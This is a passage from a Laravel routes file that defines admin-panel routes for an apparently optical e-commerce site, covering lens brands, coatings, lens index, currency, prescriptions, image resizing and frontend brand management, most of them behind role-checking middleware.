    Route::get('edit/{id}','LensBrandController@edit_lens_brand')->name('edit-lens-brand');
    Route::put('update/{id}','LensBrandController@update_lens_brand')->name('update-lens-brand');
    Route::put('bottom-button-action-lens-brand','LensBrandController@bottom_button_action_lens_brand')->name('bottom-button-action-lens-brand');
    Route::get('remove-lens-brand-image/{id}','LensBrandController@remove_lens_brand_image')->name('remove-lens-brand-image');
    });

// ROUTING FOR ADMIN -> ::MANAGE BRAND COATING::
  Route::prefix('admin/manage-brand-coating')->namespace('admin')->group(function(){
      Route::get('{id}','LensBrandController@brand_coating_list')->name('manage-brand-coating');
      Route::get('add/{id}','LensBrandController@add_brand_coating_form')->name('add-brand-coating-form');
      Route::post('add/{id}','LensBrandController@add_brand_coating')->name('add-brand-coating');
      Route::get('edit/{cat_parent_id}/{id}','LensBrandController@edit_brand_coating')->name('edit-brand-coating');
      Route::put('update/{cat_parent_id}/{id}','LensBrandController@update_brand_coating')->name('update-brand-coating');
      Route::put('bottom-button-action-brand-coating/{cat_parent_id}','LensBrandController@bottom_button_action_brand_coating')->name('bottom-button-action-brand-coating');
      
  });

});    
    
Route::group(['middleware' => 'checkRole26'],function(){    
// ROUTES FOR LENS TOGGLE
 Route::prefix('admin/lens-toggle')->namespace('admin')->group(function(){
    Route::get('','LensBrandController@lens_toggle')->name('lens-toggle');
    Route::get('add','LensBrandController@add_lens_toggle_form')->name('add-lens-toggle-form');
    Route::post('add','LensBrandController@add_lens_toggle')->name('add-lens-toggle');
    Route::get('edit/{id}','LensBrandController@edit_lens_toggle')->name('edit-lens-toggle');
    Route::put('update/{id}','LensBrandController@update_lens_toggle')->name('update-lens-toggle');
    Route::put('bottom-button-action-lens-toggle','LensBrandController@bottom_button_action_lens_toggle')->name('bottom-button-action-lens-toggle');
    }); 
 });       
        
      
Route::group(['middleware' => 'checkRole27'],function(){      
 // ROUTING FOR ADMIN -> ::MANAGE LENS INDEX::
 Route::prefix('admin/manage-lens-index')->namespace('admin')->group(function(){
  Route::get('manage-lens-index','LensBrandController@lens_index_list')->name('manage-lens-index');
  Route::get('add','LensBrandController@add_lens_index_form')->name('add-lens-index-form');
  Route::post('add','LensBrandController@add_lens_index')->name('add-lens-index');
  Route::get('edit/{id}','LensBrandController@edit_lens_index')->name('edit-lens-index'); 
  Route::put('update/{id}','LensBrandController@update_lens_index')->name('update-lens-index'); 
  Route::put('bottom-button-action-lens-index','LensBrandController@bottom_button_action_lens_index')->name('bottom-button-action-lens-index');  
 });
}); 
 
Route::group(['middleware' => 'checkRole28'],function(){ 
  // ROUTING FOR ADMIN -> ::MANAGE CURRENCY::
 Route::prefix('admin/manage-currency')->namespace('admin')->group(function(){
  Route::get('','DashboardController@currency_list')->name('manage-currency');
  Route::get('add','DashboardController@add_currency_form')->name('add-currency-form');
  Route::post('add','DashboardController@add_currency')->name('add-currency');
  Route::get('edit/{id}','DashboardController@edit_currency')->name('edit-currency'); 
  Route::put('update/{id}','DashboardController@update_currency')->name('update-currency'); 
  Route::put('bottom-button-action-currency','DashboardController@bottom_button_action_currency')->name('bottom-button-action-currency');  
 });     
});

Route::group(['middleware' => 'checkRole29'],function(){ 
 // ROUTING FOR ADMIN -> ::UPLOADED PRESCRIPTION::
 Route::prefix('admin/uploaded-prescription')->namespace('admin')->group(function(){
  Route::get('','DashboardController@uploaded_prescription')->name('uploaded-prescription');
  Route::get('delete-prescription/{id}','DashboardController@delete_prescription')->name('delete-prescription');
  
 });
});    

 // ROUTING FOR ADMIN -> ::LENS REPLACE::
 Route::prefix('admin/lens-replace')->namespace('admin')->group(function(){
  Route::get('','DashboardController@lens_replace');
  Route::get('add','DashboardController@add_lens_replace_form')->name('add-lens-replace');
  Route::post('add','DashboardController@add_lens_replace')->name('add-lens-replace');
  Route::get('edit/{id}','DashboardController@edit_lens_replace')->name('edit-lens-replace');
  Route::put('update/{id}','DashboardController@update_lens_replace')->name('update-lens-replace');
  Route::put('bottom-button-action-replace','DashboardController@bottom_button_action_replace')->name('bottom-button-action-replace');
  
 });


  // ROUTING FOR ADMIN -> ::MANAGE IMAGE SIZE::
Route::group(['middleware' => 'checkSuperAdmin'],function(){

 Route::prefix('admin/manage-image-resize')->namespace('admin')->group(function(){
   Route::get('','ImageResizeController@index')->name('manage-image-resize');
   Route::get('add','ImageResizeController@add_image_resize_form')->name('add-image-resize');
   Route::post('add','ImageResizeController@add_image_resize')->name('add-image-resize');
   Route::get('edit/{id}','ImageResizeController@edit_image_resize')->name('edit-image-resize');
   Route::put('edit/{id}','ImageResizeController@update_image_resize')->name('edit-image-resize');
   Route::put('bottom-button-action','ImageResizeController@bottom_button_action')->name('bottom-button-action');
 });

  // ROUTING FOR ADMIN -> ::MANAGE SITE FEATURE::
  Route::get('admin/manage-feature','admin\DashboardController@admin_feature')->name('manage-feature');
  Route::put('admin/manage-admin-feature','admin\DashboardController@update_admin_feature')->name('update-admin-feature');
  Route::put('admin/manage-site-feature','admin\DashboardController@update_site_feature')->name('update-site-feature');
  
  
//   =============== manage brands
Route::get('admin/frontend-brands-page','admin\DashboardController@frontend_brands')->name('manage.brands');

Route::get('admin/frontend-brands-edit/{id}','admin\DashboardController@frontend_edit_brands')->name('manage.brandsedit');

Route::post('admin/frontend-brands-update/{id}','admin\DashboardController@frontend_update_brands')->name('manage.brand_update');
Route::get('admin/frontend-brands-add','admin\DashboardController@frontend_add_brands')->name('manage.add_brands');
    
Route::post('admin/frontend-brands-store','admin\DashboardController@frontend_store_brands')->name('manage.store_brands');
Route::get('admin/frontend-brands-delete/{id}','admin\DashboardController@frontend_delete_brands')->name('manage.delete_brands');

// ================= active -------------




});
























